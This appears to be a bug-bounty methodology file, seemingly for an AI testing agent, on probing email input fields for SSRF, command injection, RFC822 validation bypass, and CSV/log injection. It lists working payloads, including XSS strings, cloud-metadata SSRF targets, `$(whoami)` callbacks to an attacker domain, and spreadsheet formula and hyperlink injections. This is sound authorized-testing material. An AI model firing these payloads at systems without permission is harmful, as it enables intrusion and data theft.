---
name: email-field-injection-testing
description: Email input field test matrix — the "email" field (signup, login, password reset, contact form, invite-a-friend, newsletter, profile update) is a single string that ends up parsed, stored, displayed, exported, and sometimes shelled-out-to across many different backend contexts, making it a disproportionately high-value single surface to sweep against a whole matrix of vuln classes in one pass. Houses the genuinely email-specific techniques with no existing home — SSRF via the email's domain/local-part triggering an outbound verification/lookup request, OS command injection via shell-metacharacter payloads confirmed with an OOB-canary domain, RFC822 malformed-but-accepted format-bypass strings (client-vs-server validation mismatch), and downstream CSV/log injection when the stored email is later exported or logged verbatim — plus a cross-reference table routing the overlapping classes (XSS, CRLF/header injection, SQLi, open redirect, homograph/IDN takeover, rate-limit bypass) to their existing deep-dive skills. Use this during Phase 2/3 (Enumeration/Vulnerability Testing) of bughunting-workflow the moment ANY input field on the target accepts an email address — not just the primary signup form. Also trigger on mentions of email field XSS/SSRF/injection, RFC822 validator, email header injection, CSV injection via email, or "test every vuln class against the email field."
---

# Email Input Field Vulnerability Testing

Field-specific technique library: one input, swept against many vuln classes. Add new entries here only for genuinely email-specific mechanics (how the payload gets *into* or *triggers* the sink via the email field specifically) — a plain "XSS payload landed" or "SQLi payload landed" finding belongs in that vuln class's own topic skill instead, applied to the email field as just another injection point.

## Core theory

An email address field is unusual among form inputs because it routinely gets consumed by more distinct backend code paths than almost any other single field:
- **Parsed** by an RFC822/RFC5322-compliant (or not) validator, often duplicated client-side (weak JS regex) and server-side (a stricter or, just as often, a *weaker* library) — the mismatch between the two is itself a bug class.
- **Stored** raw in a database column, later rendered back into HTML (profile page, admin user list) — an XSS sink.
- **Displayed** to other users/admins in contexts a normal input never reaches — support ticket viewers, "who signed up" admin dashboards, automated notification emails — classic blind-XSS territory.
- **Used to trigger an outbound action** — sending a verification email, pinging a deliverability/MX-lookup service, fetching a Gravatar-style avatar keyed on the email hash, notifying a third-party CRM/webhook of the new signup — any of these can be an SSRF vector if the domain part of the email is used to build a URL/hostname server-side.
- **Exported** — nearly every admin panel has a "export users to CSV" button, and email is always a column; a formula-shaped stored value becomes Excel/Sheets formula injection the moment an admin opens the export.
- **Logged** verbatim on signup/login/failed-attempt events — an email containing a raw newline can inject a fake log line.
- **Occasionally shelled out to** — some validation/deliverability-check libraries wrap an external CLI tool (spam-score checkers, SPF/DKIM lookup utilities, legacy Perl/PHP mail-validation scripts) without proper escaping.

**Recon signal:** any field on the target labeled/typed as email — not just the primary signup form. Check registration, login (many apps use email as the username), password reset, profile/account settings, contact/support forms, newsletter signup, "invite a friend," and any B2B "add team member by email" feature — each is a separate injection point worth the same sweep.

## Test matrix — what to try, and where the deep technique lives

| Class | Email-shaped payload example | Deep-dive skill |
|---|---|---|
| XSS (stored/reflected/blind) | `"><script>alert(1)</script>@test.com`, `"><svg/onload=alert(3)>@test.com` | `blind-xss-testing` if the render target isn't directly visible (admin panel/notification email); `csp-misconfig-xss-testing` if it reflects directly back to you |
| Email header injection / CRLF | `test@example.com%0d%0aBcc:attacker@example.com` | `crlf-injection-testing` |
| SQL injection | standard SQLi payloads in the local-part | `sqli-waf-bypass-testing` |
| Open redirect | if the email field's *value* is echoed into a post-verification redirect target | `open-redirect-testing` |
| Homograph/IDN takeover | Cyrillic/lookalike-character domains, punycode | `registration-flow-testing` entry #11 — already has the full Burp-Collaborator-verified exploit chain, don't duplicate here |
| Duplicate-registration / email-transfer / verification-bypass business logic | re-register same email, change to another user's email, intercept+modify the verification request | `registration-flow-testing` entry #1 and `session-auth-testing`'s email-verification entries |
| Missing/bypassable rate limiting | automate password-reset/registration attempts across many emails | `registration-flow-testing` entry #3 and `rate-limit-bypass-testing` |
| SSRF, command injection, format bypass, downstream CSV/log injection | see below | recorded here — no existing home |

## Recorded techniques

### 1. SSRF via the email's domain/local-part
Source: [The Ultimate Guide to Email Input Field Vulnerability Testing](https://infosecwriteups.com/the-ultimate-guide-to-email-input-field-vulnerability-testing-18f96fc42251)

**Where:** any flow that does something server-side with an email address beyond storing it — sending a verification email through a system that first resolves/validates the domain, a Gravatar-style avatar fetch keyed on the email hash, a deliverability/MX-lookup pre-check, or a "notify our CRM/webhook of new signup" integration that builds a request using the submitted address.

**Root cause:** the email's domain part is attacker-controlled input; if any backend code path turns that domain into something it makes a network connection to (MX lookup, webhook URL construction, avatar-fetch URL), it's exactly as exploitable as a `url=` parameter.

**Exploit steps:**
1. Submit `test@127.0.0.1`, `test@localhost`, `test@169.254.169.254` as the email value in every flow identified above.
2. RFC-strict validators often reject a literal IP or `localhost` as the domain part outright — if so, register a throwaway domain you control with an A record pointing at `127.0.0.1` or an internal target IP, and use `test@your-controlled-domain.com` instead so it passes format validation while still resolving to the target.
3. For blind confirmation (no reflected response), point the domain's A record at an Interactsh/Burp Collaborator listener instead of a static IP, and watch for the inbound DNS/HTTP hit correlated with your submission timing.
4. If a hit lands, retarget the same mechanism at `169.254.169.254` (cloud metadata) or an internal-only hostname to escalate from "confirmed outbound request" to "confirmed internal network reach."

**Impact framing for report:** SSRF — severity set by what's reachable (cloud metadata/IAM creds = Critical, internal service enumeration = High); cross-reference `ssrf-testing`'s Interactsh/Collaborator confirmation methodology and cloud-metadata escalation for the full playbook once the email-field vector confirms the server makes the outbound call.

**Generalize note:** this is the email-field-specific instance of `ssrf-testing`'s general parameter-identification problem — add "any email field that triggers a server-side action" to that skill's mental checklist of injection points, alongside `url=`/`webhook=` parameters.

### 2. OS command injection via shell-metacharacter payloads + OOB canary
**Where:** any backend that validates/processes the email by shelling out to an external tool rather than a pure-library call — more common with legacy deliverability-checkers, SPF/DKIM lookup wrappers, or a Perl/PHP mail-validation script invoked via `system()`/`exec()`/`popen()`.

**Root cause:** if the email string is interpolated into a shell command unsanitized, shell metacharacters in the local-part or domain part are executed rather than treated as literal text.

**Exploit steps:**
1. Submit payloads that embed an attacker-controlled OOB domain as the argument to command substitution, so a successful execution triggers a DNS lookup you can observe on an Interactsh/Burp Collaborator listener:
   ```
   `whoami`.yourdomain.oast.fun
   $(whoami).yourdomain.oast.fun
   ${USER}.yourdomain.oast.fun
   ```
2. Watch the OOB listener for an inbound DNS request — a hit confirms command execution even with zero reflected output (fully blind).
3. If a hit lands, escalate the payload to a more diagnostic command (`id`, `hostname`) still wrapped the same way, before ever attempting anything with real impact — report on the DNS-callback PoC alone; a blind command-injection confirmation is already a Critical-severity finding without needing a working shell.

**Impact framing for report:** OS command injection — Critical regardless of payload sophistication; the blind OOB-callback confirmation is sufficient evidence, don't escalate toward reverse shells/destructive commands against a target you don't control.

**Generalize note:** this OOB-canary-via-command-substitution pattern generalizes to any input field suspected of reaching a shell invocation, not just email — the email field is just an unusually common place for it because of legacy validation tooling.

### 3. RFC822 malformed-but-accepted format bypass (client/server validation mismatch)
**Where:** any registration/profile form with email format validation duplicated between frontend (JS regex) and backend.

**Root cause:** frontend and backend validators are frequently different implementations with different strictness — a string the backend's (looser) parser accepts as a valid address can still be one the frontend's regex was written to reject, or vice versa, and either mismatch is worth probing because business logic downstream may assume "passed validation" means "is a normal address."

**Test payloads (submit directly to the backend endpoint, bypassing the frontend JS):**
```
"test@evil.com"@example.com
test@subdomain..com
test@-example.com
```
(plus whatever other RFC822 edge cases — quoted local-parts, consecutive dots, leading hyphens in the domain — the target's specific backend library might mishandle differently from its frontend regex.)

**Methodology:** use a permissive local RFC822 validator to generate a candidate list of technically-legal-but-unusual addresses before testing them against the target, rather than guessing one at a time:
```bash
python rfc822_email_validator.py
# prompts for an address, prints: RFC822 valid: YES / RFC822 valid: NO
```
(Reference implementation: `coffinxp/RFC822-Email-Validator` on GitHub — a small script using `colorama` for colored YES/NO output; useful for confirming an edge-case string actually is RFC822-legal before spending time proving the target's backend disagrees with its own frontend about it.)

**Impact framing for report:** on its own this is just a validation-inconsistency observation — the actual bug is whatever downstream logic breaks because of it (duplicate-account creation via two technically-different-but-effectively-identical addresses, a stored value that breaks a later parser, an address that satisfies "is valid" but fails silently at actual delivery leaving the account permanently unverified). Always chain to a concrete downstream consequence before reporting.

**Generalize note:** cross-reference `registration-flow-testing`'s server-side-validation-bypass entry (#8) for the broader "frontend validates, backend doesn't re-check" pattern — this is that same bug class scoped specifically to RFC822 format edge cases.

### 4. Downstream CSV/log injection via stored email
**Where:** any app with an admin-facing "export users/leads to CSV/Excel" feature, or that logs the raw submitted email verbatim on signup/login/failed-attempt events.

**Root cause:** the email is stored as a plain string and later written into a CSV export or a log line without escaping characters that are meaningful in *that* downstream format — a leading `=`/`+`/`-`/`@` is interpreted as a formula by Excel/Sheets, and an embedded newline splits one log entry into two.

**Exploit steps:**
1. Register (or update your profile to) an email-shaped string with a formula payload as the local-part/display value the export will include verbatim:
   ```
   =cmd|' /C calc'!A0
   "=HYPERLINK(\"http://evil.com\")"
   ```
   (Real target validation will often reject these as the literal *email* field — this technique is most viable on any adjacent field exported in the same CSV row as the email, e.g. a "display name" or "company" field, or on a backend lax enough to store the raw string despite frontend rejection per technique #3.)
2. For log injection, submit an address containing an encoded/raw newline (`test@example.com\nInjectedLogEntry`) and check whether server-side logging writes it as one entry or splits it — a split confirms an attacker can forge fake log lines to confuse an incident responder reading that log later.
3. For the CSV path, get an admin/internal user to open the export (or, if you control a test admin account in a lab/authorized environment, demonstrate it yourself) — the formula executes in whatever spreadsheet app opens the file, potentially reaching out to `evil.com` (SSRF-via-victim's-machine, not the server) or worse depending on macro settings.

**Impact framing for report:** CSV injection is typically Medium (requires local victim interaction with macros/external-content warnings usually intact by default in modern Excel, so demonstrate the security-prompt bypass isn't required, or note it clearly if it is); log injection severity depends entirely on what downstream process trusts the log (SIEM parsing bypass, forged audit trail) — frame around that specific consequence rather than "log injection" alone.

**Generalize note:** this is a second-order/stored-injection pattern — the payload doesn't fire at submission time, it fires later when a *different* consumer (an admin's spreadsheet app, a log parser) processes the stored value. Worth checking on any field that ends up in an export or gets logged raw, not just email.

<!-- Add new recorded techniques below this line as new email-field-specific writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
